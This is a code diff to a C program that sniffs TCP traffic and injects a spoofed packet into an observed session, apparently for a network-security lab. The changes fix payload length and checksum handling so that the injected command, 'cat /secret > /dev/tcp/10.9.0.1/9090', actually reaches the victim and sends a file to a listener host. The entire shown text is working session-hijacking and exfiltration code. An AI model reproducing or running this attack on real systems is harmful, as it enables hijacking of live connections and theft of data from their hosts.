@@ -101,26 +101,26 @@ void send_command(const char *target_ip, u_short target_port,
 	tcp_pkt->header.check = 0;
 	tcp_pkt->header.urg_ptr = 0;
 
-	memcpy(tcp_pkt->data, command, strlen(command) + 1);
+	u_int cmd_len = strlen(command) + 1;
+	memcpy(tcp_pkt->data, command, cmd_len);
 
 	psh_t *tcp_chksum_buff = (psh_t *)tcp_psuedo_buff;
-	memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt,
-		   sizeof(tcp_t) + strlen(command) + 1);
+	memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t) + cmd_len);
 
 	tcp_chksum_buff->src_addr = ip_pkt->header.saddr;
 	tcp_chksum_buff->dst_addr = ip_pkt->header.daddr;
 	tcp_chksum_buff->_placeholder = 0;
 	tcp_chksum_buff->protocol = IPPROTO_TCP;
-	tcp_chksum_buff->tcp_len = htons(sizeof(tcp_t));
+	tcp_chksum_buff->tcp_len = htons(sizeof(tcp_t) + cmd_len);
 
-	int transmit_len = sizeof(ip_t) + sizeof(tcp_t);
+	int transmit_len = sizeof(ip_t) + sizeof(tcp_t) + cmd_len;
 
 	ip_pkt->header.check = in_checksum((u_short *)ip_pkt, sizeof(ip_t));
 
-	memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t));
+	memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t) + cmd_len);
 
-	tcp_pkt->header.check =
-		in_checksum((u_short *)tcp_psuedo_buff, sizeof(psh_t) + sizeof(tcp_t));
+	tcp_pkt->header.check = in_checksum(
+		(u_short *)tcp_psuedo_buff, sizeof(psh_t) + sizeof(tcp_t) + cmd_len);
 
 	sendto(sock, packet_buffer, transmit_len, 0, (struct sockaddr *)&sin,
 		   sizeof(sin));
@@ -153,7 +153,7 @@ void sniff_tcp(u_char *user, const struct pcap_pkthdr *header,
 				   src_ip, src_port, dst_ip, dst_port, seq);
 
 			send_command(src_ip, src_port, dst_ip, dst_port, seq,
-						 "\r cat /secret > /dev/tcp/10.9.0.1/9090 \r");
+						 "\r cat /secret > /dev/tcp/10.9.0.1/9090 \r\n");
 		}
 	}
 }
